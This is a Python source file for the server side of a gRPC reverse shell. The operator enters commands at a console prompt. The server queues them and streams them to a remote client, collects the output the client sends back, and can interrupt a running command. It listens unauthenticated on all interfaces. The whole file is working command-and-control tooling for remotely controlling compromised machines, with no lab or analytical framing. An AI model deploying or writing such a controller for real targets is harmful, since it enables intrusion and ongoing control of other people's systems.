import grpc
import asyncio
from concurrent import futures
import reverse_shell_pb2
import reverse_shell_pb2_grpc
import logging
import time
import signal

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', handlers=[logging.StreamHandler()])

class ReverseShellService(reverse_shell_pb2_grpc.ReverseShellServiceServicer):
    def __init__(self):
        self.client_queue = asyncio.Queue()
        self.responses = {}

    async def add_command_to_queue(self, command, request_id):
        """Add a command to the queue."""
        await self.client_queue.put((request_id, command))
        logging.info(f"Added command to queue: {command} with request ID: {request_id}. Queue size now: {self.client_queue.qsize()}")

    async def StartSession(self, request_iterator, context):
        while True:
            if not self.client_queue.empty():
                request_id, command = await self.client_queue.get()
                logging.info(f"Sending command to client: {command} with request ID: {request_id}")
                
                yield reverse_shell_pb2.CommandRequest(request_id=request_id, command=command)
                
                # Wait for the command to be acknowledged as completed before sending the next one
                while request_id in self.responses and self.responses[request_id].is_active:
                    await asyncio.sleep(0.5)
            await asyncio.sleep(0.1)


    async def StreamResponses(self, request_iterator, context):
        """Receive and accumulate responses from the client."""
        async for request in request_iterator:
            request_id = request.request_id
            output = request.output
            is_active = request.is_active

            print(output)  # Print the output to server logs for debugging

            if request_id not in self.responses:
                self.responses[request_id] = reverse_shell_pb2.CommandResponse(
                    request_id=request_id,
                    output='',
                    is_active=is_active
                )

            self.responses[request_id].output += output
            self.responses[request_id].is_active = is_active

            if not is_active:
                logging.info(f"Command with request ID {request_id} finished.")
                break  # Stop receiving if the command is finished

        return reverse_shell_pb2.CommandResponse()

async def command_interface(reverse_shell_service):
    def handle_stop_signal(signum, frame):
        nonlocal stop_command
        stop_command = True
        logging.info("Received stop signal (Ctrl+C). Stopping the current command...")

    signal.signal(signal.SIGINT, handle_stop_signal)

    while True:
        stop_command = False
        command = input("Enter a command to execute: ")
        if command.strip():
            request_id = f"command-{hash(command + str(time.time()))}"

            await reverse_shell_service.add_command_to_queue(command, request_id)

            while True:
                if stop_command:
                    # Clear the queue before adding the "STOP" command
                    while not reverse_shell_service.client_queue.empty():
                        discarded_command = await reverse_shell_service.client_queue.get()
                        logging.info(f"Clearing command from queue: {discarded_command}")

                    # Now add the "STOP" command
                    await reverse_shell_service.add_command_to_queue("STOP", request_id)
                    logging.info("Added 'STOP' command to queue")
                    break
                
                if request_id in reverse_shell_service.responses:
                    response = reverse_shell_service.responses[request_id]
                    if not response.is_active:
                        reverse_shell_service.responses.pop(request_id, None)
                        break
                await asyncio.sleep(1)
        else:
            logging.info("No command entered, skipping.")

async def serve():
    server = grpc.aio.server(futures.ThreadPoolExecutor(max_workers=10))
    reverse_shell_service = ReverseShellService()
    reverse_shell_pb2_grpc.add_ReverseShellServiceServicer_to_server(reverse_shell_service, server)
    server.add_insecure_port('[::]:50051')
    logging.info("gRPC server is starting...")

    await server.start()
    
    await asyncio.gather(
        command_interface(reverse_shell_service),
        server.wait_for_termination()
    )

if __name__ == "__main__":
    asyncio.run(serve())
